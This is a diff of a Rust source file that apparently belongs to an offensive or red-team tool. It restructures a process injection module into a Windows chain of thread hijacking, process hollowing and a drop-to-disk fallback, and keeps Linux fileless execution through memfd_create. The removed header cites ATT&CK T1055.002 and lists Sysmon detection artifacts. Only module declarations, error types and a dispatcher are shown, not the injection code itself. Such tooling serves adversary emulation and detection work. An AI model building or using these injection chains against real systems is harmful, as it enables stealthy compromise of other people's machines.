@@ -1,60 +1,28 @@
-//! Process Injection Module
-//!
-//! Implements classic process injection techniques:
-//! - Windows: CreateRemoteThread injection (T1055.002)
-//! - Linux: memfd_create + fexecve (fileless execution)
-//!
-//! Detection artifacts:
-//! - Sysmon EID 8: CreateRemoteThread
-//! - Sysmon EID 10: Process Access
-//! - auditd: memfd_create syscall
+//! Injection module — Windows: WTH -> hollow -> drop-to-disk.
+//! Linux: memfd_create fileless (unchanged from S5).
 
-#[cfg(windows)]
-pub(crate) mod winapi;
-
-#[cfg(windows)]
-pub mod windows;
-
-#[cfg(windows)]
-pub mod pe_map;
-
-#[cfg(windows)]
-pub mod wth;
-
-#[cfg(windows)]
-pub mod hollow;
-
+#[cfg(windows)] pub(crate) mod winapi;
+#[cfg(windows)] pub mod pe_map;
 pub mod stub;
-
-#[cfg(unix)]
-pub mod linux;
+#[cfg(windows)] pub mod wth;
+#[cfg(windows)] pub mod hollow;
+#[cfg(windows)] mod windows;
+#[cfg(unix)]    mod linux;
 
 use thiserror::Error;
 
 #[derive(Debug, Error)]
 pub enum InjectionError {
-    #[error("failed to find target process")]
-    ProcessNotFound,
-    #[error("failed to open target process: {0}")]
-    OpenFailed(String),
-    #[error("failed to allocate memory: {0}")]
-    AllocFailed(String),
-    #[error("failed to write memory: {0}")]
-    WriteFailed(String),
-    #[error("failed to create thread: {0}")]
-    ThreadFailed(String),
-    #[error("failed to execute: {0}")]
-    ExecFailed(String),
+    #[error("target process not found")]   ProcessNotFound,
+    #[error("open failed: {0}")]           OpenFailed(String),
+    #[error("alloc failed: {0}")]          AllocFailed(String),
+    #[error("write failed: {0}")]          WriteFailed(String),
+    #[error("thread op failed: {0}")]      ThreadFailed(String),
+    #[error("run failed: {0}")]            RunFailed(String),
+    #[error("not implemented: {0}")]       NotImplemented(String),
 }
 
-/// Inject payload into target process/memory and execute.
 pub fn inject_and_run(payload: &[u8]) -> Result<(), InjectionError> {
-    #[cfg(windows)]
-    {
-        windows::inject(payload)
-    }
-    #[cfg(unix)]
-    {
-        linux::run_fileless(payload)
-    }
+    #[cfg(windows)] { windows::inject_with_fallback(payload) }
+    #[cfg(unix)]    { linux::run_fileless(payload) }
 }
